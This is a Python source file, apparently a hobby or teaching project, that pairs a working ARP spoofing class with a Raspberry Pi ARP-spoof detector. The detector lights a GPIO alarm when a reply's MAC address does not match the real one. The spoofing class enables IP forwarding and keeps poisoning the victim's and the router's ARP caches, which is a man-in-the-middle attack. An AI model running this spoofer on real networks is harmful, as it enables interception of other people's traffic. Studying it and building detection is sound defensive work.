from struct import pack
import scapy.all as scapy
import time
from subprocess import call
import sys
import RPi.GPIO as GPIO


class ARPspoof:
    def __init__(self, target, router, ip_forward = True):

        """
        DOCSTRING:  this function initalizes the APR spoof class
        target:     this is the IP address of the victim (a string)
        router:     this is the IP address of the router (a string)
        ip_forward: usualy linux doesnt allow packets to flow through it. we need to allow ip forwarding to supply
                    internet connection to the victims machine (is a boolean)
        """

        self.target = str(target)
        self.router = str(router)
        self.ip_forward = bool(ip_forward)

        self.__sleep = 1

        if ip_forward:
            call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)


    def request_mac(self, ip):

        """
        DOCSTRING: this function will create a ARP request to broadcast ans ask the MAC address of a given IP
        ip:        ip is the IP address of the machine which we need the MAC (a string)
        return:    the mac address of the machine (a string)
        """
        # create a ARP packet using scapy
        arp_packet = scapy.ARP(pdst = ip) # creating a arp request to ask the mac of a ip
        broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")

        arp_req_broadcast =  broadcast / arp_packet
        answers = scapy.srp(arp_req_broadcast, timeout = 1, verbose = False)[0]

        return answers[0][1].hwsrc

    def send_arp_packet(self, target, source, restore = False):

        """
        DOCSTRING: this function will create and send an ARP response to spoof one side (single side)
        target:    the ip of the target (a string)
        source:    the ip of the source (a string)
        """
        try:
            if not restore:
                packet = scapy.ARP(
                    op    = 2,                          # we need to create a ARP response, not a request
                    pdst  = target,                     # the ip address of the victims machine
                    hwdst = self.request_mac(target),   # the mac address of the victims machine
                    psrc  = source                      # the ip address of the router
                )
            
            else:
                packet = scapy.ARP(
                    op    = 2,                          # we need to create a ARP response, not a request
                    pdst  = target,                     # the ip address of the victims machine
                    hwdst = self.request_mac(target),   # the mac address of the victims machine
                    psrc  = source,                     # the ip address of the router
                    hwsrc = self.request_mac(source)
                )

            scapy.send(packet, verbose = False)     # send the created packet to the network
            print(f"[+] ARP response sent from {source} to {target}")
        
        except IndexError:
            print(f"Could not find the MAC address of the given ip - {target}")
            exit()

        

    
    def run(self):

        try:
            while True:
                self.send_arp_packet(self.router, self.target)
                self.send_arp_packet(self.target, self.router)
                print()
                time.sleep(self.__sleep)
        
        except KeyboardInterrupt:
            print("ARP spoof terminating....")
            self.stop()
            exit()

        except Exception as err:
            print("Unknown error occured. Program quitting")
            print(f"Error - {err}")

    def stop(self):
        self.send_arp_packet(self.router, self.target, True)
        self.send_arp_packet(self.target, self.router, True)
        print("[+] Restored original ARP tables")


class ARPdetect:
    def __init__(self, interface):

        """
        DOCSTRING: this function intializes the ARP detection function
        interface: this is the interface we are monitoring
        """

        self.interface = str(interface)
        self.__real_packets = 0
        self.__spoof_packets = 0
        
        # initializing the BOARD
        GPIO.setmode(GPIO.BCM)
        GPIO.setup(17, GPIO.OUT)
        GPIO.output(17, GPIO.LOW) # start with low


    def request_mac(self, ip):

        """
        DOCSTRING: this function will create a ARP request to broadcast ans ask the MAC address of a given IP
        ip:        ip is the IP address of the machine which we need the MAC (a string)
        return:    the mac address of the machine (a string)
        """
        # create a ARP packet using scapy
        arp_packet = scapy.ARP(pdst = ip) # creating a arp request to ask the mac of a ip
        broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")

        arp_req_broadcast =  broadcast / arp_packet
        answers = scapy.srp(arp_req_broadcast, timeout = 1, verbose = False)[0]

        return answers[0][1].hwsrc

    def process_packet(self, packet):
        """
        DOCSTRING: this function will process all the packets captured by the sniffing function.
                   and search for ARP packets. if we have a ARP packet then check if that is a response. then check
                   if the source is really the router
        packet:    is a scapy packet sniffed by scapy
        """

        if packet.haslayer(scapy.ARP): # checking if the packet has a ARP layer
            if packet[scapy.ARP].op == 2: # checking weather the ARP is a response?
                try:
                    real_mac = self.request_mac(packet[scapy.ARP].psrc)
                    response_mac = packet[scapy.ARP].hwsrc

                    if real_mac == response_mac:
                        self.__real_packets += 1 # this is a real ARP response
                    else:
                        self.__spoof_packets += 1 # this is a spoofed packet

                        print("ARP Spoof detected")
                        GPIO.output(17, GPIO.HIGH) #sound alarm
                        input("Press any key to reset the sequrity system ...")
                        GPIO.output(17, GPIO.LOW) # off the alarm



                except IndexError:
                    pass

    def detect(self):
        scapy.sniff(iface = self.interface, store = False, prn = self.process_packet)

